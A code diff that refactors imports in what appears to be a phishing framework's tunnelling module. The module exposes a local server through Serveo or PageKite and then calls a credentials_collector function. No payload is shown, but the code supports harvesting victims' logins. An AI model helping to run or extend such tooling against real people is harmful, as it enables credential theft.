@@ -11,9 +11,9 @@ from Defs.ImportManager.unsorted_will_be_replaced import run_command, run_backgr
 import Defs.ThemeManager.theme as theme
 import Defs.LocalizationManager.lang_action_manager.lang_server.lang_server_runner as localization
 import Defs.LocalizationManager.lang_global_usage as global_localization
+from Defs.LocalizationManager.helper import print_sorted_as_menu
 import os
 
-default_palette = theme.default_palette
 try:
     os.mkdir("Server/www")
 except FileExistsError:
@@ -233,8 +233,6 @@ def start_serveo(port):
             return random(port)
 
     def custom(port):
-        import Defs.ActionManager.main_runner as main_runner
-
         # print('''
         # {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         # |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
@@ -329,7 +327,7 @@ def start_serveo(port):
         print(localization.lang_start_serveo["choose_type_of_url"])
 
         # print(" \n".format(default_palette[0], default_palette[2]))
-        main_runner.print_sorted_as_menu(localization.lang_start_serveo["url_types"])
+        print_sorted_as_menu(localization.lang_start_serveo["url_types"])
         choice = input(global_localization.input_line)
         run_command('clear')
         if choice == '1':
@@ -592,4 +590,4 @@ def start_pagekite(port):
             run_command('python2 Server/pagekite.py --clean --signup {0} {1}.pagekite.me'.format(port, subdomain))
         except KeyboardInterrupt:
             print('[!] Please Copy the Generated Link For Further Use')
-            simple_informant.credentials_collector(port)
+            credentials_collector(port)
